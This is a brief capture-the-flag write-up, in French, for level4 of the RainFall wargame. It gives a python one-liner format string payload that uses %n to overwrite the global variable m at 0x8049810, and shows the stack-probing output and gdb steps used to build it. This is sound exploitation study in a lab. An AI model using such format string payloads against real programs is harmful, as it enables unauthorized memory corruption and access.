# Solution 

```
python -c 'print("\x10\x98\x04\x08" + "%16930112x" + "%12$n")' | ./level4
```

## Explication du level

La solution ici est identique au lvl precedent

```
level4@RainFall:~$ python -c 'print("AAAA" + " %p " * 12)' | ./level4 
AAAA 0xb7ff26b0  0xbffff794  0xb7fd0ff4  (nil)  (nil)  0xbffff758  0x804848d  0xbffff550  0x200  0xb7fd1ac0  0xb7ff37d0  0x41414141 

level4@RainFall:~$ gdb ./level4 
(gdb) p &m
$1 = (<data variable, no debug info> *) 0x8049810
```

1025544 en hexa = 16930116 - 4 de l'adresse 16930112

python -c 'print("\x10\x98\x04\x08" + "%16930112x" + "%12$n")' | ./level4

Pas besoin de cat car cela affiche le mdp directement